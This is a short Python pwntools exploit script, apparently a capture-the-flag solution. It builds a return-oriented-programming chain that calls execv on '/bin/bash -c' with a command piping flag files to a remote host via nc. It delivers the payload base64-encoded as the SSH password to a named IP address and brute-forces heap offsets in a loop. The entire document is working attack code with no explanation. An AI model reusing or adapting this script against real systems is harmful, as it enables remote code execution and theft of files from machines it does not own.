from pwn import *
import base64
import sys

def gen(off):
  #heap = 0x5555558370a0
  heap = 0x55555582b2a0
  #      0x55555582b2d0
  heap += off

  payload = ""

  payload+=p64(heap+8)              # [0] = heap
  payload+=p64(heap+5*8)
  payload+=p64(heap+5*8+len('/bin/bash\x00'))
  payload+=p64(heap+5*8+len('/bin/bash\x00-c\x00'))
  payload+=p64(0)

  payload+= "/bin/bash\x00"
  payload+= "-c\x00"
  payload+= "cat /home/*/flag.txt | nc [REDACTED] 1337\x00"

  print len(payload)

  payload = payload.ljust(104, "A")

  payload+=p64(0x0000555555554000+0xb95d6) #pop rdi
  payload+=p64(heap+5*8)
  payload+=p64(0xf63e+0x0000555555554000) #pop rsi
  payload+=p64(heap+8)
  payload+=p64(0x0000555555554000+0x00000000000ef97) #call execv

  output = base64.b64encode(payload)
  return output

for i in range(0, 0x100, 0x10):
  for j in range(2):
    for k in range(24):
      if j == 0:
        v = i
      else:
        v = -i

      print '{} tried once'.format(hex(v))
      try:
        sh = ssh('factorycontrol', '142.93.107.255', 22, password=gen(v))
        sh.interactive()
        sh.close()
      except:
        pass
